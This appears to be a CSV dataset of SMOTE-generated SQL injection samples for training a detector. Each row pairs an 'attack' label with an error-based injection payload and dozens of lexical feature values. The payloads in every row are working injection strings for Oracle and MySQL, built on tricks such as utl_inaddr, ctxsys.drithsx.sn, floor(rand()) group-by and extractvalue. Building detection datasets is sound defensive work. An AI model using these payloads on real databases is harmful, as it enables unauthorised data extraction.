id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000214,attack,error,"1%' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and '%'  =  '",nearest_attack_euclidean,R000019,0.36732883990787313,342.00053804449317,33.900053804449314,3.5297833444096343,83.70016141334796,49.0,147.80010760889863,61.500269022246584,0.2447325766207104,0.1432859124648249,0.43218166223892035,0.17979984867554438,3.7001614133479532,0.0,0.0,0.0,0.0,2.9000538044493176,0.0,30.09994619555068,1.8001076088986352,0.0,1.0,22.900053804449318,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.9000538044493176,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.900053804449318
SMOTE_000215,attack,error,"1%""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000017,1.935480115065558,282.0391438423158,37.889260678055734,3.9463941860639533,101.37136180814863,37.37136180814863,106.18568090407432,37.110739321944266,0.3593407497785788,0.13225395007706617,0.3765972090054449,0.1318080911389101,0.29642022601857865,2.8143190959256854,0.5928404520371574,0.0,2.0,2.0,0.0,20.0,1.4071595479628427,2.0,5.0,4.592840452037157,0.2964202260185787,0.7035797739814215,0.29642022601857865,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.29642022601857865,2.0,0.7035797739814214,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000216,attack,error,"1'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000027,0.28925647581353925,333.7870355157305,33.07870355157306,3.4615680336350243,81.23611065471916,49.0,146.1574071031461,57.39351775786527,0.24337347526459968,0.14680950857326017,0.4378913261370787,0.17192569002506145,1.2361106547191594,0.0,0.0,0.0,0.0,2.078703551573053,0.0,30.921296448426947,0.15740710314610618,0.0,1.0,22.078703551573053,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.078703551573053,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.078703551573053
SMOTE_000217,attack,error,"1"" where 2131  =  2131 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",nearest_attack_euclidean,R000016,1.8049154112086077,344.2015383422535,33.658914020132556,3.513947273176396,84.2945701006628,54.27131216106047,147.3178280402651,58.31782804026512,0.24487144777175612,0.15749868357668567,0.4281717043280933,0.1694581643234649,0.34108597986744105,0.6589140201325591,1.3178280402651184,0.0,0.0,2.658914020132559,0.0,30.34108597986744,0.0,0.0,1.0,23.976742060397676,0.34108597986744094,0.6589140201325592,0.6589140201325591,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.6589140201325592,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.658914020132559
SMOTE_000218,attack,error,"1%' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and '%'  =  '",nearest_attack_euclidean,R000019,1.6416606645405052,338.533219285282,33.5533219285282,3.500986345092236,82.65996578558459,49.0,147.10664385705638,59.76660964264097,0.24415883385856846,0.14477339370000772,0.4345919889751146,0.17647578346630924,2.6599657855845864,0.0,0.0,0.0,0.0,2.5533219285281956,0.0,30.4466780714718,1.106643857056391,0.0,1.0,22.55332192852819,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.5533219285281954,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.553321928528195
SMOTE_000219,attack,error,-7810 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   -- vuvj,nearest_attack_euclidean,R000011,0.16295390895583037,332.1140956207352,35.923936252843184,3.671385421106102,91.54361751705912,48.152127494313625,135.41835060936248,57.0,0.2756517192821074,0.14498318412440958,0.4077368233546942,0.17162827323878882,0.0,0.0,2.9239362528431867,0.0,0.0,2.0,0.0,28.11409562073522,0.0,2.8859043792647805,0.03803187357840665,24.923936252843184,0.0,0.0,0.9619681264215934,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000220,attack,error,"1',  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000028,2.512059881918386,271.2365264285307,37.97658012698051,4.001552396111473,100.42388541268664,38.953160253961016,98.88290063490254,32.97658012698051,0.3708072286899583,0.14337702480995707,0.36401102923191403,0.12180471726817056,1.0,0.0,0.9882900634902534,0.0,2.0,1.4941450317451266,0.0,18.988290063490254,0.0,2.0,5.505854968254873,4.48243509523538,1.0,0.0,0.4941450317451267,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.4941450317451267,2.0,0.0,0.49414503174512664,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,8.988290063490254
SMOTE_000221,attack,error,"1'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000027,0.8915238768314719,335.4257398290384,33.242573982903835,3.4751779063547965,81.7277219487115,49.0,146.48514796580767,58.21286991451918,0.2436446342794879,0.14610650371984624,0.4367521713337917,0.17349669066687418,1.7277219487115094,0.0,0.0,0.0,0.0,2.2425739829038367,0.0,30.757426017096165,0.4851479658076729,0.0,1.0,22.242573982903835,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.2425739829038365,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.242573982903837
SMOTE_000222,attack,error,"-4822"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""owbp""  =  ""owbp",nearest_attack_euclidean,R000013,0.32055983049235076,347.1882774204647,35.87448171969021,3.7188358889870385,98.18413117798637,48.56483226139405,140.50207312123916,59.937240859845105,0.28281806549308575,0.139867924895195,0.40467567339814686,0.17263833621357244,0.0,3.8117225795353153,1.0627591401548948,0.0,0.0,3.0,0.0,28.12551828030979,0.0,2.811722579535316,0.06275914015489459,24.062759140154895,0.0,1.0,0.0627591401548947,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0627591401548947,1.0,1.0,0.9372408598451052,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000223,attack,error,"1'+  (  select bruk where 1400  =  1400 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'",nearest_attack_euclidean,R000014,1.6024545856101822,228.24585059579184,34.64404268691662,3.888973988059014,76.06787193925014,42.80794308411117,84.64404268691662,24.725992885513897,0.3323495874067131,0.18721149642613424,0.37200153262886254,0.10843738353829012,1.725992885513897,0.0,0.274007114486103,0.0,0.27400711448610315,1.725992885513897,0.0,14.548014228972207,0.0,0.0,4.451985771027794,3.7259928855138975,1.0,0.0,0.0,0.2740071144861031,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.7259928855138968,0.0,0.7259928855138971,0.0,0.0,0.27400711448610304,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.27400711448610304,0.0,1.0,1.0,6.0
SMOTE_000224,attack,error,"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'tuzl'  =  'tuzl",nearest_attack_euclidean,R000018,0.3834672283716654,208.22835220984967,31.0,3.9438862765833744,76.47203045937083,36.47203045937083,72.24367824952115,23.04061304158686,0.367138535528836,0.1749736926276521,0.34717923432487396,0.1107085375186379,4.0,0.0,0.0,0.0,0.0,1.9187739168262816,0.0,12.162452166347435,0.0,0.0,4.959386958413141,1.9187739168262823,1.0,0.0,0.0,0.0,0.0,0.9593869584131409,1.0,0.0,0.0,1.0,0.0,0.9593869584131407,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.04061304158685913,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9593869584131407,0.9593869584131407,4.918773916826281
SMOTE_000225,attack,error,"1'+  (  select bruk where 1400  =  1400 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'",nearest_attack_euclidean,R000014,2.6484516910574962,235.26292463173996,32.15805024550669,3.7983751165074513,75.94830147304015,41.63220098202677,90.15657291319312,27.525849263479927,0.32299407929460955,0.17707280142388773,0.3830072364176994,0.11692588286380332,1.1580502455066912,1.683899508986617,0.0,0.0,0.0,2.0,0.0,15.683899508986617,0.8419497544933086,0.0,5.0,3.1580502455066917,0.5790251227533457,0.4209748772466544,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.5790251227533456,0.0,0.5790251227533457,0.0,0.42097487724665433,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.579025122753346
SMOTE_000226,attack,error,"1'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  'fvbv'  =  'fvbv",nearest_attack_euclidean,R000026,0.9898419406262646,335.17430650919005,37.69928629192194,3.874769579024852,108.84964314596097,51.99286291921945,134.3842984222828,39.947502021726805,0.3269268925256401,0.15426504907012867,0.39947038137962587,0.11933767702460533,4.0,0.0,0.0,0.0,2.0,2.0,0.0,24.79714516768778,0.0,0.30071370807805486,5.849643145960973,4.849643145960972,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,5.548929437882917,2.548929437882918,0.0,1.1503568540390274,1.1503568540390274,0.8496431459609726,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.1503568540390274,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,13.39857258384389
SMOTE_000227,attack,error,1' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'fdbm' like 'fdbm,nearest_attack_euclidean,R000022,1.2113566346172635,341.0445245444894,33.67037704537412,3.631674795719411,96.41867204360464,46.31849181850354,140.6369836370071,57.67037704537412,0.28226323107818,0.1359435615866449,0.41267019164928326,0.16912301568589186,3.011131136122345,0.0,0.0,0.0,0.0,2.0,0.0,28.988868863877656,0.0,2.011131136122345,0.3296229546258851,22.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.670377045374115,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.6703770453741145
SMOTE_000228,attack,error,"1""  )   as mwja where 7881  =  7881 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",nearest_attack_euclidean,R000025,0.9970662786617264,324.7282660103145,40.51319985935311,4.055623500052717,110.48680014064689,61.70186629160828,117.70186629160828,34.837733286451034,0.34038821686995674,0.18991147637742764,0.36240824830366564,0.10729205844895,0.649066854195858,0.8377332864510355,1.6754665729020712,0.0,2.0,1.8377332864510354,0.0,20.837733286451034,0.0,0.0,6.0,6.513199859353106,0.1622667135489646,0.8377332864510354,0.8377332864510354,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.8377332864510354,1.0,1.0,0.1622667135489645,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000229,attack,error,"-9740""   )    )    as pxkx where 5305  =  5305 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000024,2.394012645699632,230.80891930798924,39.18016416214093,3.8337068587406455,67.08462381613555,43.18016416214093,94.81619699456913,25.72793433514363,0.2892785208520341,0.18711195905589872,0.4114943272907526,0.11211519280131463,0.0,1.0,1.3639671675718135,0.0,1.0,2.0,0.0,16.0,0.0,0.0,3.3639671675718135,4.363967167571813,0.0,1.0,0.36396716757181335,0.6360328324281866,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.7279343351436267,0.0,1.0,0.36396716757181335,0.36396716757181335,0.6360328324281865,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6360328324281865,0.0,0.6360328324281868,0.6360328324281868,7.0
SMOTE_000230,attack,error,"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'tuzl'  =  'tuzl",nearest_attack_euclidean,R000018,0.2810415873166353,209.399476951481,31.310704295596352,3.9463927455820613,76.3785914088073,37.0,72.93211288678906,23.08877265588467,0.3648954365299303,0.17670908548341166,0.3481420756953663,0.11025340229129171,3.8668410161729914,0.0,0.04438632794233621,0.0,0.04438632794233621,1.9556136720576638,0.0,12.22193163971168,0.0,0.0,4.911227344115328,2.0443863279423358,1.0,0.0,0.0,0.04438632794233621,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.9556136720576638,0.04438632794233621,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.04438632794233621,0.0,1.0,1.0,5.044386327942336
SMOTE_000231,attack,error,"1%""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000021,0.2895775472504177,299.57339060244686,36.09706437590213,3.7824682476531604,99.90293562409788,35.0,123.05871248195747,41.61174249639149,0.33367618402267524,0.11690930892622421,0.4105249879772073,0.13888951907389321,0.0,4.0,0.0,0.0,2.0,2.0,0.0,23.611742496391493,1.9999999999999996,2.0,5.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,1.9029356240978736,0.09706437590212624,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000232,attack,error,"1%' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and '%'  =  '",nearest_attack_euclidean,R000019,0.6704289972477528,341.1758353719633,33.81758353719633,3.5229339706003158,83.45275061158898,49.0,147.63516707439265,61.08791768598164,0.24459611175487533,0.143639710265138,0.43275495908269307,0.1790092188972936,3.452750611588983,0.0,0.0,0.0,0.0,2.817583537196328,0.0,30.182416462803673,1.6351670743926552,0.0,1.0,22.817583537196327,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.8175835371963278,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.817583537196327
SMOTE_000233,attack,error,"1%""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000017,0.7919404523113868,283.6363230234123,36.73454707906351,3.885084082678961,99.2654529209365,35.0,110.30905841872982,39.061811683745965,0.3504259746070911,0.12357721919072095,0.38831132121034106,0.13768548499184696,0.0,4.0,0.0,0.0,2.0,2.0,0.0,21.06181168374596,1.9999999999999996,2.0,5.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,1.2654529209364906,0.7345470790635094,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000234,attack,error,"1'   )    )    as clhk where 4607  =  4607 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R000023,1.5041782180911976,290.08377769089964,39.30890194545288,3.976055903090713,105.15707185454102,41.15707185454101,108.07853592727051,35.69109805454712,0.36243786576670345,0.14167313397340764,0.37266334873535045,0.12322565152453849,0.7696339818176264,0.9214640727294947,1.5392679636352526,0.0,2.0,2.0,0.0,20.0,0.46073203636474735,2.0,5.0,5.539267963635253,0.7696339818176263,0.23036601818237376,0.7696339818176263,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.7696339818176263,2.0,0.2303660181823738,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000235,attack,error,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'kdxg' like 'kdxg",nearest_attack_euclidean,R000007,2.701510161571909,306.59256021147775,38.0,4.0484341017053,112.01424003253504,49.085440195210225,109.52136004880255,35.97151993492992,0.36544726119580917,0.15975667699115575,0.35727807786795707,0.117517983945078,4.0,0.0,0.0,0.0,2.0,1.4928799837324813,0.0,20.0,0.0,0.9857599674649627,5.507120016267518,4.985759967464963,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,5.014240032535037,1.5213600488025558,0.49287998373248154,1.4928799837324815,0.5071200162675186,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.49287998373248143,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,12.521360048802556
SMOTE_000236,attack,error,"-4822"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""owbp""  =  ""owbp",nearest_attack_euclidean,R000013,1.8546385783118653,345.33743005356575,35.16871502678288,3.650531614657224,92.76536270087159,48.41564248660856,143.3251398928685,60.83128497321712,0.268508710915716,0.14021081406039282,0.41510811819196747,0.17617235683192373,0.0,4.0,0.5843575133914395,0.0,0.0,3.0,0.0,28.831284973217123,0.8312849732171208,1.7530725401743186,0.4156424866085606,23.58435751339144,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.4156424866085604,0.5843575133914394,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
